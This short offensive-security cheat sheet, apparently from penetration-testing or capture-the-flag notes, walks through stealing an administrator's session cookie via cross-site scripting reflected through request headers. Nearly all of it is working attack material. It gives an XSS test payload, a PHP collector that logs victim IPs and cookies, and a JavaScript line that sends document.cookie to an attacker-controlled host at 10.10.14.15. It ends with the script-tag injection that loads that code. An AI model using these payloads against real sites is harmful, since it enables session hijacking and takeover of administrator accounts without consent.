For this to work the content of the user request like the user-agent have to be reflected to a page or stored in logs for them to be seen in an admin or error panel.

# Stealing admin cookie
```
Test for XSS
 "><script src=http://10.10.14.15:9000/TESTING_THIS</script>

Once identified...
Create two files
1. index.php

<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>

2. script.js

new Image().src='http://10.10.14.15:9200/index.php?c='+document.cookie

Start a web server ...

sudo php -S 0.0.0.0:9200

Execute the XSS payload in the vulnerable fields... 
"><script src=http://10.10.14.15:9200/script.js></script>

```